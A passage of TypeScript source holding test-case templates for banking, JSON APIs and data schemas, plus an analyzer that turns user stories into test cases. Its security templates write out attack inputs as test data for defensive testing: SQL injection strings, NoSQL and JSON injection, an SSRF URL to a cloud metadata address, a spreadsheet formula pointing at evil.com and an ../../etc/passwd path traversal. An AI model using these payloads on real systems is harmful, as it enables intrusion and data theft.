    gherkin: {
      given: "A user is at an ATM with their debit card",
      when: "They enter a valid PIN and request a withdrawal within their daily limit",
      then: "Cash is dispensed and the account balance is updated",
    },
    relevantFields: ["accountNumber", "balance"],
    contextKeywords: ["withdraw", "balance"],
  },
  {
    title: "Direct deposit received and reflected in balance",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "An employer sends a direct deposit to an employee's account",
      when: "The ACH transfer is processed",
      then: "The deposit appears in the account with the correct amount and payer details",
    },
    relevantFields: [
      "accountNumber",
      "routingNumber",
      "balance",
      "bankName",
    ],
    contextKeywords: ["deposit", "direct deposit"],
  },
  // ---- Negative ----
  {
    title: "Transfer fails with insufficient funds",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user has a balance of $100.00",
      when: "They attempt to transfer $150.00",
      then: 'The transfer is rejected with "Insufficient funds" and the balance remains unchanged',
    },
    relevantFields: ["balance"],
    contextKeywords: ["transfer", "withdraw"],
  },
  {
    title: "Transfer fails with invalid routing number",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is on the transfer page",
      when: 'They enter an invalid routing number "000000000"',
      then: 'An error "Invalid routing number" is displayed',
    },
    relevantFields: ["routingNumber"],
  },
  {
    title: "International transfer fails with invalid IBAN",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is initiating an international transfer",
      when: 'They enter an IBAN with incorrect check digits "XX00INVALIDIBAN"',
      then: "The IBAN validation fails with an appropriate error message",
    },
    relevantFields: ["iban"],
    contextKeywords: ["transfer", "iban"],
  },
  {
    title: "Negative transfer amount is rejected",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is on the transfer page",
      when: 'They enter a negative amount "-50.00"',
      then: "The system rejects the input with a validation error",
    },
    relevantFields: ["balance"],
  },
  {
    title: "Transfer to own account is prevented",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user is on the transfer page",
      when: "They enter their own account number as the destination",
      then: 'An error "Cannot transfer to the same account" is displayed',
    },
    relevantFields: ["accountNumber"],
    contextKeywords: ["transfer"],
  },
  {
    title: "Account closure fails with pending transactions",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user requests to close their account",
      when: "There are pending transactions on the account",
      then: "Account closure is denied until all pending transactions are settled",
    },
    relevantFields: ["accountNumber", "balance"],
    contextKeywords: ["account"],
  },
  {
    title: "Withdrawal exceeds daily ATM limit",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user has already withdrawn their daily limit of $500",
      when: "They attempt another withdrawal of $100",
      then: 'The withdrawal is rejected with "Daily withdrawal limit reached"',
    },
    relevantFields: ["balance"],
    contextKeywords: ["withdraw"],
  },
  {
    title: "Transfer fails with account number exceeding max length",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user is entering a destination account number",
      when: "They enter an account number with more digits than allowed",
      then: "The field rejects input beyond the maximum length",
    },
    relevantFields: ["accountNumber"],
  },
  // ---- Boundary ----
  {
    title: "Transfer of the minimum allowed amount ($0.01)",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A user is on the transfer page",
      when: "They enter the minimum allowed transfer amount of $0.01",
      then: "The transfer processes successfully for one cent",
    },
    relevantFields: ["balance", "currency"],
  },
  {
    title: "Balance exactly zero after transfer",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A user has a balance of exactly $200.00",
      when: "They transfer exactly $200.00",
      then: "The balance is $0.00 and the account is not flagged as overdrawn",
    },
    relevantFields: ["balance"],
  },
  {
    title: "Routing number with exactly 9 digits",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering a routing number",
      when: "They enter exactly 9 digits that pass the ABA checksum",
      then: "The routing number is accepted as valid",
    },
    relevantFields: ["routingNumber"],
  },
  {
    title: "Account number with leading zeros",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering a destination account number",
      when: 'They enter "00012345678" with leading zeros',
      then: "The leading zeros are preserved and the account is found",
    },
    relevantFields: ["accountNumber"],
  },
  {
    title: "IBAN at maximum length (34 characters)",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering an IBAN for an international transfer",
      when: "They enter a valid IBAN at the maximum length of 34 characters",
      then: "The IBAN is accepted and validated correctly",
    },
    relevantFields: ["iban"],
  },
  {
    title: "Transfer amount with maximum decimal precision",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering a transfer amount",
      when: 'They enter "$100.999" with 3 decimal places',
      then: "The amount is rounded to 2 decimal places ($101.00) or an error is shown",
    },
    relevantFields: ["balance", "currency"],
  },
  // ---- Security ----
  {
    title: "SQL injection in account number lookup",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is on the transfer page",
      when: "They enter \"1' OR '1'='1\" in the account number field",
      then: "The input is parameterized, no SQL injection occurs, and a validation error is returned",
    },
    relevantFields: ["accountNumber"],
  },
  {
    title: "Unauthorized access to another user account details",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user manipulates the API request",
      when: "They change the account ID in the request to another user's account",
      then: "The server returns 403 Forbidden and no account details are exposed",
    },
    relevantFields: ["accountNumber", "balance"],
  },
  {
    title: "Account number and balance not exposed in URL",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A user navigates to their account page",
      when: "The page loads",
      then: "Sensitive data like account number and balance are not present in the URL or query parameters",
    },
    relevantFields: ["accountNumber", "balance"],
  },
  {
    title: "Transfer API requires authentication token",
    category: "security",
    priority: "high",
    gherkin: {
      given: "An unauthenticated user has the transfer API endpoint URL",
      when: "They send a transfer request without a valid authentication token",
      then: "The request is rejected with 401 Unauthorized",
    },
    relevantFields: ["accountNumber", "routingNumber", "balance"],
    contextKeywords: ["transfer"],
  },
  {
    title: "Rate limiting on balance inquiry API",
    category: "security",
    priority: "medium",
    gherkin: {
      given: "An automated tool sends rapid balance inquiry requests",
      when: "More than 60 requests are made within 1 minute",
      then: "Rate limiting is enforced and excess requests receive 429 Too Many Requests",
    },
    relevantFields: ["accountNumber", "balance"],
  },
  {
    title: "Man-in-the-middle protection on transfer confirmation",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A user is completing a bank transfer",
      when: "The transfer confirmation is sent to the server",
      then: "The request uses HTTPS with certificate pinning and any tampered request is rejected",
    },
    relevantFields: ["accountNumber", "routingNumber", "balance"],
  },
];

const JSON_PAYLOAD_TEMPLATES: TestCaseTemplate[] = [
  // ---- Positive ----
  {
    title: "Valid JSON payload accepted by API endpoint",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "An API consumer has the endpoint documentation",
      when: "They send a well-formed JSON payload with all required fields",
      then: "The API returns 200 OK with the expected response body",
    },
    relevantFields: ["fieldName", "fieldType"],
    contextKeywords: ["api", "endpoint", "json", "rest"],
  },
  {
    title: "POST request creates resource and returns 201",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "An authenticated API consumer is creating a new resource",
      when: "They send a POST request with a valid JSON body",
      then: "The server returns 201 Created with the new resource ID and location header",
    },
    relevantFields: ["fieldName", "fieldType"],
    contextKeywords: ["api", "post", "endpoint", "rest"],
  },
  {
    title: "GET request returns correct resource by ID",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A resource with a known ID exists in the system",
      when: "A GET request is made to the resource endpoint with the ID",
      then: "The server returns 200 OK with the full resource representation in JSON",
    },
    relevantFields: ["fieldName", "fieldType"],
    contextKeywords: ["api", "get", "endpoint", "rest"],
  },
  {
    title: "API response includes correct content-type header",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "An API consumer sends a request",
      when: "The server responds",
      then: 'The response includes "Content-Type: application/json" header',
    },
    relevantFields: ["fieldName", "fieldType"],
    contextKeywords: ["api", "json", "response"],
  },
  {
    title: "Paginated API response returns correct page metadata",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "An API endpoint returns a collection of resources",
      when: "The consumer requests page 2 with 10 items per page",
      then: "The response contains exactly 10 items with correct pagination metadata (total, page, pageSize)",
    },
    relevantFields: ["fieldName", "fieldType", "arrays"],
  },
  {
    title: "Webhook payload delivered with correct structure",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A webhook is configured for a specific event",
      when: "The triggering event occurs",
      then: "The webhook payload is delivered with the documented JSON structure and event type",
    },
    relevantFields: ["fieldName", "fieldType", "nestedObjects"],
    contextKeywords: ["webhook", "payload"],
  },
  // ---- Negative ----
  {
    title: "Malformed JSON body returns 400 Bad Request",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "An API consumer sends a request",
      when: "The request body contains malformed JSON (missing closing brace)",
      then: "The server returns 400 Bad Request with a descriptive parse error message",
    },
    relevantFields: ["fieldName", "fieldType"],
    contextKeywords: ["api", "json", "request"],
  },
  {
    title: "Missing required field returns validation error",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "An API consumer sends a POST request",
      when: "A required field is omitted from the JSON payload",
      then: "The server returns 422 Unprocessable Entity listing the missing field",
    },
    relevantFields: ["fieldName", "fieldType"],
  },
  {
    title: "Wrong data type for field returns type error",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "An API consumer sends a request",
      when: 'They send a string value for a field that expects an integer (e.g., "age": "twenty")',
      then: "The server returns 422 with a type mismatch error for the field",
    },
    relevantFields: ["fieldName", "fieldType"],
  },
  {
    title: "Unsupported HTTP method returns 405",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "An API endpoint only supports GET and POST",
      when: "A DELETE request is sent to the endpoint",
      then: "The server returns 405 Method Not Allowed with an Allow header",
    },
    relevantFields: ["fieldName"],
    contextKeywords: ["api", "endpoint", "rest"],
  },
  {
    title: "Request with unsupported content type returns 415",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "An API endpoint expects application/json",
      when: "A request is sent with Content-Type: text/xml",
      then: "The server returns 415 Unsupported Media Type",
    },
    relevantFields: ["fieldName", "fieldType"],
    contextKeywords: ["api", "json"],
  },
  {
    title: "GET request for non-existent resource returns 404",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "An API consumer sends a GET request",
      when: "The requested resource ID does not exist",
      then: "The server returns 404 Not Found with a descriptive message",
    },
    relevantFields: ["fieldName"],
    contextKeywords: ["api", "get", "endpoint"],
  },
  {
    title: "Extra unknown fields in payload are handled gracefully",
    category: "negative",
    priority: "low",
    gherkin: {
      given: "An API consumer sends a request",
      when: "The payload includes fields not defined in the API schema",
      then: "The server either ignores the extra fields or returns a clear validation warning",
    },
    relevantFields: ["fieldName", "fieldType"],
  },
  {
    title: "Empty request body returns validation error",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "An API consumer sends a POST request",
      when: "The request body is completely empty",
      then: "The server returns 400 Bad Request indicating a body is required",
    },
    relevantFields: ["fieldName"],
    contextKeywords: ["api", "post"],
  },
  // ---- Boundary ----
  {
    title: "Maximum payload size accepted",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "An API has a maximum payload size limit of 1MB",
      when: "A request with a payload of exactly 1MB is sent",
      then: "The request is accepted and processed successfully",
    },
    relevantFields: ["fieldName", "fieldType"],
  },
  {
    title: "Payload exceeding maximum size is rejected",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "An API has a maximum payload size limit of 1MB",
      when: "A request with a payload of 1.1MB is sent",
      then: "The server returns 413 Payload Too Large",
    },
    relevantFields: ["fieldName", "fieldType"],
  },
  {
    title: "Deeply nested JSON object accepted up to max depth",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "An API accepts nested JSON objects",
      when: "A payload with nesting depth at the maximum allowed level (e.g., 10 levels) is sent",
      then: "The payload is parsed and processed correctly",
    },
    relevantFields: ["nestedObjects"],
  },
  {
    title: "Array field with maximum allowed items",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "An API accepts an array field",
      when: "An array at the maximum allowed item count (e.g., 1000 items) is sent",
      then: "All items are processed and no items are lost",
    },
    relevantFields: ["arrays"],
  },
  {
    title: "String field at maximum length",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "An API field has a maxLength constraint of 255 characters",
      when: "A string of exactly 255 characters is sent for that field",
      then: "The value is accepted and stored without truncation",
    },
    relevantFields: ["fieldName", "fieldType"],
  },
  {
    title: "Numeric field at maximum safe integer",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "An API accepts integer fields",
      when: "The value Number.MAX_SAFE_INTEGER (9007199254740991) is sent",
      then: "The value is accepted without precision loss",
    },
    relevantFields: ["fieldType"],
  },
  // ---- Security ----
  {
    title: "JSON injection attempt in string field",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is sending an API request",
      when: 'They include "{\\\"admin\\\": true}" as a string field value to attempt JSON injection',
      then: "The value is treated as a plain string and does not modify the object structure",
    },
    relevantFields: ["fieldName", "fieldType"],
  },
  {
    title: "API endpoint requires authentication",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A protected API endpoint exists",
      when: "A request is sent without an Authorization header",
      then: "The server returns 401 Unauthorized",
    },
    relevantFields: ["fieldName"],
    contextKeywords: ["api", "endpoint"],
  },
  {
    title: "NoSQL injection attempt in query parameter",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user targets a search API",
      when: 'They send a query parameter with value {"$gt": ""}',
      then: "The input is sanitized and the NoSQL operator is not executed",
    },
    relevantFields: ["fieldName", "fieldType"],
    contextKeywords: ["api", "endpoint", "request"],
  },
  {
    title: "SSRF attempt via URL field in payload",
    category: "security",
    priority: "high",
    gherkin: {
      given: "An API accepts a URL field in the payload",
      when: 'A user sends "http://169.254.169.254/latest/meta-data/" as the URL value',
      then: "The server blocks requests to internal/metadata IP addresses",
    },
    relevantFields: ["fieldName", "fieldType"],
  },
  {
    title: "API response does not leak stack traces",
    category: "security",
    priority: "medium",
    gherkin: {
      given: "An API request triggers a server error",
      when: "The server returns a 500 Internal Server Error",
      then: "The response contains a generic error message without stack traces, file paths, or internal details",
    },
    relevantFields: ["fieldName"],
    contextKeywords: ["api", "response"],
  },
  {
    title: "Rate limiting applied to API endpoints",
    category: "security",
    priority: "medium",
    gherkin: {
      given: "An API consumer sends requests to a rate-limited endpoint",
      when: "They exceed the rate limit (e.g., 100 requests per minute)",
      then: "The server returns 429 Too Many Requests with a Retry-After header",
    },
    relevantFields: ["fieldName"],
    contextKeywords: ["api", "endpoint"],
  },
];

const SCHEMA_TEMPLATES: TestCaseTemplate[] = [
  // ---- Positive ----
  {
    title: "CSV file imported with correct column mapping",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A user has a well-formatted CSV file with headers matching the expected schema",
      when: "They upload and import the CSV",
      then: "All rows are imported with data mapped to the correct columns",
    },
    relevantFields: ["columns", "dataTypes"],
    contextKeywords: ["csv", "import"],
  },
  {
    title: "SQL query returns correct result set",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A database table contains known test records",
      when: "A SELECT query is executed with a WHERE clause",
      then: "Only the matching records are returned with correct column values",
    },
    relevantFields: ["tableName", "columns", "dataTypes"],
    contextKeywords: ["sql", "query", "database"],
  },
  {
    title: "Database migration creates table with correct schema",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A new migration script is ready to execute",
      when: "The migration runs against the database",
      then: "The new table is created with all specified columns, types, and constraints",
    },
    relevantFields: ["tableName", "columns", "dataTypes", "constraints"],
    contextKeywords: ["migration", "database", "schema"],
  },
  {
    title: "Data export produces valid CSV with all records",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A table contains 500 records",
      when: "The user exports the data to CSV",
      then: "The CSV file contains a header row and exactly 500 data rows with correct formatting",
    },
    relevantFields: ["columns", "dataTypes"],
    contextKeywords: ["export", "csv", "data"],
  },
  {
    title: "Schema validation passes for conforming records",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A schema defines required fields with specific types and constraints",
      when: "A batch of records conforming to the schema is validated",
      then: "All records pass validation with no errors",
    },
    relevantFields: ["columns", "dataTypes", "constraints"],
    contextKeywords: ["schema", "data"],
  },
  {
    title: "Bulk insert of 1000 records completes without errors",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A dataset of 1000 valid records is prepared",
      when: "The bulk insert operation is executed",
      then: "All 1000 records are inserted and the row count matches",
    },
    relevantFields: ["tableName", "columns"],
    contextKeywords: ["bulk", "data", "record", "import"],
  },
  // ---- Negative ----
  {
    title: "CSV import fails with mismatched column count",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A CSV file has rows with different numbers of columns than the header",
      when: "The import is attempted",
      then: "An error identifies the rows with mismatched columns and the import is rolled back",
    },
    relevantFields: ["columns"],
    contextKeywords: ["csv", "import"],
  },
  {
    title: "SQL insert fails due to NOT NULL constraint violation",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A table has a NOT NULL constraint on a required column",
      when: "An INSERT statement omits that column",
      then: "The database returns a constraint violation error and the record is not inserted",
    },
    relevantFields: ["columns", "constraints"],
    contextKeywords: ["sql", "database"],
  },
  {
    title: "Duplicate primary key insertion is rejected",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A record with a specific primary key already exists",
      when: "Another record with the same primary key is inserted",
      then: "The database returns a unique constraint violation error",
    },
    relevantFields: ["columns", "constraints", "indexes"],
    contextKeywords: ["database", "sql", "record"],
  },
  {
    title: "CSV import fails with invalid date format",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A CSV file contains date fields in an unexpected format (e.g., DD/MM/YYYY instead of YYYY-MM-DD)",
      when: "The import is attempted",
      then: "Rows with invalid date formats are flagged and the user is prompted to specify the date format",
    },
    relevantFields: ["columns", "dataTypes"],
    contextKeywords: ["csv", "import", "data"],
  },
  {
    title: "Foreign key constraint prevents orphan records",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A child table has a foreign key referencing a parent table",
      when: "A record is inserted with a foreign key value that does not exist in the parent",
      then: "The database returns a foreign key constraint violation",
    },
    relevantFields: ["relationships", "constraints"],
    contextKeywords: ["database", "sql"],
  },
  {
    title: "Schema validation fails for wrong data types",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A schema expects integer values for an age column",
      when: 'A record with "twenty-five" in the age column is validated',
      then: "A type mismatch error is returned for the age column",
    },
    relevantFields: ["columns", "dataTypes"],
    contextKeywords: ["schema", "data"],
  },
  // ---- Boundary ----
  {
    title: "CSV import with empty file (header only, no data rows)",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A CSV file contains only the header row with no data",
      when: "The import is attempted",
      then: "The import completes with zero records and no error is thrown",
    },
    relevantFields: ["columns"],
    contextKeywords: ["csv", "import"],
  },
  {
    title: "Maximum column count in schema definition",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A schema is defined with the maximum supported number of columns (e.g., 200)",
      when: "A table is created from the schema",
      then: "The table is created with all columns intact",
    },
    relevantFields: ["columns", "dataTypes"],
    contextKeywords: ["schema", "table"],
  },
  {
    title: "VARCHAR column at maximum length",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A table has a VARCHAR(255) column",
      when: "A record with a 255-character string is inserted",
      then: "The string is stored completely without truncation",
    },
    relevantFields: ["columns", "dataTypes", "constraints"],
    contextKeywords: ["database", "sql"],
  },
  {
    title: "CSV with fields containing commas in quoted strings",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A CSV file has fields containing commas inside quoted strings",
      when: "The file is parsed",
      then: "The quoted commas are treated as part of the field value, not as delimiters",
    },
    relevantFields: ["columns"],
    contextKeywords: ["csv", "import", "data"],
  },
  {
    title: "Table name with maximum allowed length",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A table name at the maximum allowed length (e.g., 64 characters for MySQL) is specified",
      when: "The table is created",
      then: "The table is created successfully with the full-length name",
    },
    relevantFields: ["tableName"],
    contextKeywords: ["table", "database"],
  },
  {
    title: "Integer column at MAX_INT value",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A table has an INTEGER column",
      when: "A record with 2147483647 (INT MAX) is inserted",
      then: "The value is stored correctly without overflow",
    },
    relevantFields: ["columns", "dataTypes"],
    contextKeywords: ["database", "sql"],
  },
  // ---- Security ----
  {
    title: "SQL injection via CSV import data",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A CSV file contains SQL injection payloads in data cells",
      when: 'A cell contains "Robert\'); DROP TABLE students;--" and the CSV is imported',
      then: "The import uses parameterized queries and no SQL is executed from the data",
    },
    relevantFields: ["columns"],
    contextKeywords: ["csv", "import", "sql"],
  },
  {
    title: "CSV formula injection prevention",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A CSV file is being exported for download",
      when: 'A data field contains "=HYPERLINK(\\"http://evil.com\\",\\"Click\\")"',
      then: "The formula is escaped with a leading apostrophe to prevent execution in spreadsheet software",
    },
    relevantFields: ["columns"],
    contextKeywords: ["csv", "export", "data"],
  },
  {
    title: "Database credentials not exposed in connection error",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A database connection fails",
      when: "The error is returned to the user",
      then: "The error message does not contain the database hostname, username, or password",
    },
    relevantFields: ["tableName"],
    contextKeywords: ["database", "sql"],
  },
  {
    title: "Unauthorized schema modification attempt is blocked",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A user without admin privileges is viewing a table",
      when: "They attempt to ALTER or DROP the table via API",
      then: "The request is denied with a 403 Forbidden and the table remains unchanged",
    },
    relevantFields: ["tableName", "columns"],
    contextKeywords: ["database", "schema", "table"],
  },
  {
    title: "Exported data file download requires authentication",
    category: "security",
    priority: "medium",
    gherkin: {
      given: "A data export link has been generated",
      when: "An unauthenticated user attempts to download the file",
      then: "The download is denied with 401 Unauthorized",
    },
    relevantFields: ["columns"],
    contextKeywords: ["export", "data", "csv"],
  },
  {
    title: "Path traversal in import file name",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is uploading a file for import",
      when: "They set the filename to \"../../etc/passwd\"",
      then: "The server sanitizes the filename and stores the file in the designated upload directory",
    },
    relevantFields: ["columns"],
    contextKeywords: ["import", "csv", "data"],
  },
];

const TEMPLATES_BY_DOMAIN: Record<string, TestCaseTemplate[]> = {
  "user-profile": USER_PROFILE_TEMPLATES,
  address: ADDRESS_TEMPLATES,
  "credit-card": CREDIT_CARD_TEMPLATES,
  banking: BANKING_TEMPLATES,
  json: JSON_PAYLOAD_TEMPLATES,
  schema: SCHEMA_TEMPLATES,
};

// ---------------------------------------------------------------------------
// Analyzer implementation
// ---------------------------------------------------------------------------

let globalCaseCounter = 0;

function generateTestCaseId(domain: string, category: string): string {
  globalCaseCounter++;
  const domainPrefix = domain
    .split("-")
    .map((part) => part[0]?.toUpperCase() ?? "")
    .join("");
  const categoryPrefix = category[0]?.toUpperCase() ?? "";
  return `TC-${domainPrefix}${categoryPrefix}-${String(globalCaseCounter).padStart(3, "0")}`;
}

/**
 * Normalizes a string for keyword matching.
 * Converts to lowercase and collapses whitespace.
 */
function normalizeText(text: string): string {
  return text.toLowerCase().replace(/[^a-z0-9\s]/g, " ").replace(/\s+/g, " ").trim();
}

/**
 * Detects which domains are relevant for a given user story
 * based on keyword matching with confidence scoring.
 */
function detectDomains(story: string): DetectedDomain[] {
  const normalized = normalizeText(story);
  const detected: DetectedDomain[] = [];

  for (const config of DOMAIN_CONFIGS) {
    const matchedKeywords: string[] = [];

    for (const keyword of config.keywords) {
      const normalizedKeyword = normalizeText(keyword);
      // Use word boundary matching for single words, substring for multi-word phrases
      if (normalizedKeyword.includes(" ")) {
        if (normalized.includes(normalizedKeyword)) {
          matchedKeywords.push(keyword);
        }
      } else {
        // Match as a whole word to avoid partial matches (e.g., "card" matching "discard")
        const regex = new RegExp(`\\b${escapeRegex(normalizedKeyword)}\\b`);
        if (regex.test(normalized)) {
          matchedKeywords.push(keyword);
        }
      }
    }

    if (matchedKeywords.length > 0) {
      // Confidence is based on the ratio of matched keywords to total keywords,
      // capped at 1.0. Having 3+ matches gives a high confidence.
      const rawConfidence = matchedKeywords.length / Math.min(config.keywords.length, 5);
      const confidence = Math.min(1, Math.round(rawConfidence * 100) / 100);

      detected.push({
        domain: config.domain,
        confidence,
        keywords: matchedKeywords,
        generatorLink: config.generatorLink,
      });
    }
  }

  // Sort by confidence descending
  detected.sort((a, b) => b.confidence - a.confidence);
  return detected;
}

/**
 * Escapes special regex characters in a string.
 */
function escapeRegex(str: string): string {
  return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * Determines whether a template's context keywords (if any) match
 * the keywords that were detected in the user story.
 */
function templateMatchesContext(
  template: TestCaseTemplate,
  matchedKeywords: string[]
): boolean {
  // If no contextKeywords are specified, the template always applies.
  if (!template.contextKeywords || template.contextKeywords.length === 0) {
    return true;
  }
  const normalizedMatched = matchedKeywords.map(normalizeText);
  return template.contextKeywords.some((ck) =>
    normalizedMatched.includes(normalizeText(ck))
  );
}

/**
 * Generates test cases for a single detected domain using the template library.
 */
function generateTestCasesForDomain(
  detectedDomain: DetectedDomain
): TestCase[] {
  const templates = TEMPLATES_BY_DOMAIN[detectedDomain.domain];
  if (!templates) {
    return [];
  }

  const domainConfig = DOMAIN_CONFIGS.find(
    (c) => c.domain === detectedDomain.domain
  );
  if (!domainConfig) {
    return [];
  }

  const cases: TestCase[] = [];

  for (const template of templates) {
    if (!templateMatchesContext(template, detectedDomain.keywords)) {
      continue;
    }

    // Filter relevant fields to only those the generator actually has
    const filteredFields = template.relevantFields.filter((f) =>
      domainConfig.dataFields.includes(f)
    );

    cases.push({
      id: generateTestCaseId(detectedDomain.domain, template.category),
      title: template.title,
      category: template.category,
      priority: template.priority,
      gherkin: { ...template.gherkin },
      domain: detectedDomain.domain,
      generatorLink: detectedDomain.generatorLink,
      dataFields:
        filteredFields.length > 0 ? filteredFields : domainConfig.dataFields.slice(0, 3),
    });
  }

  return cases;
}

/**
 * Builds the summary statistics from generated test cases.
 */
function buildSummary(
  testCases: TestCase[]
): AnalysisResult["summary"] {
  const byCategory: Record<string, number> = {};
  const byDomain: Record<string, number> = {};
  const byPriority: Record<string, number> = {};

  for (const tc of testCases) {
    byCategory[tc.category] = (byCategory[tc.category] ?? 0) + 1;
    byDomain[tc.domain] = (byDomain[tc.domain] ?? 0) + 1;
    byPriority[tc.priority] = (byPriority[tc.priority] ?? 0) + 1;
  }

  return {
    totalCases: testCases.length,
    byCategory,
    byDomain,
    byPriority,
  };
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * Analyzes a user story string and produces structured test cases
 * with linked test data generator categories.
 *
 * @param story - A user story string, typically in the format:
 *   "As a <role>, I want to <action> so that <benefit>"
 * @returns An AnalysisResult containing detected domains, test cases, and summary statistics.
 *
 * @example
 * ```ts
 * const result = analyzeUserStory(
 *   "As a user, I want to register with my email and password so I can access my dashboard"
 * );
 * console.log(result.detectedDomains);  // [{domain: "user-profile", confidence: 0.6, ...}]
 * console.log(result.testCases.length); // ~24 test cases
 * ```
 */
export function analyzeUserStory(story: string): AnalysisResult {
  // Reset the global counter for each analysis run so IDs are deterministic
  globalCaseCounter = 0;

  const detectedDomains = detectDomains(story);

  const testCases: TestCase[] = [];
  for (const domain of detectedDomains) {
    const domainCases = generateTestCasesForDomain(domain);
    testCases.push(...domainCases);
  }

  return {
    userStory: story,
    detectedDomains,
    testCases,
    summary: buildSummary(testCases),
  };
}
